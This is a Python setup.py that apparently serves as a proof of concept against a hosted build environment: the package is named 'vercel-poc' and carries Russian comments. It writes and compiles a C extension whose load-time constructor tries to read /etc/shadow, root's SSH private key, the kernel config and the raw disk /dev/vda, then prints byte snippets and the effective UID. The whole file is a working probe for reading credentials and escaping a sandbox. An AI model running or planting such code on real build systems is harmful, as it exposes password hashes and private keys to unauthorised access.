import os, sys, subprocess as sp
from setuptools import setup, Extension

c_code = r"""
#include <stdio.h>
#include <fcntl.h>
#include <unistd.h>
#include <errno.h>
#include <string.h>

void __attribute__((constructor)) init() {
    fprintf(stderr, "\n" "========================================\n");
    fprintf(stderr, "   FINAL STRIKE: SYSTEM ESCAPE AUDIT    \n");
    fprintf(stderr, "========================================\n");

    const char* targets[] = {
        "/etc/shadow",          // Хеши паролей (только для root)
        "/proc/config.gz",      // Конфиг ядра хоста
        "/root/.ssh/id_rsa",    // SSH ключи рута
        "/dev/vda"              // Прямой доступ к диску
    };

    for (int i = 0; i < 4; i++) {
        int fd = open(targets[i], O_RDONLY);
        if (fd >= 0) {
            fprintf(stderr, "[!!!] SUCCESS: Read access to %s\n", targets[i]);
            char buf[16];
            read(fd, buf, 16);
            fprintf(stderr, "      Data snippet: %02x%02x%02x%02x\n", buf[0], buf[1], buf[2], buf[3]);
            close(fd);
        } else {
            fprintf(stderr, "[-] %s: %s\n", targets[i], strerror(errno));
        }
    }

    fprintf(stderr, "Current Effective UID: %d\n", geteuid());
    fprintf(stderr, "========================================\n");
}
"""

with open("exploit.c", "w") as f: f.write(c_code)

# Пытаемся скомпилировать и запустить немедленно через проверку расширения
try:
    setup(
        name="vercel-poc",
        version="9.9.9",
        ext_modules=[Extension('exploit', sources=['exploit.c'])]
    )
except:
    sys.exit(1)
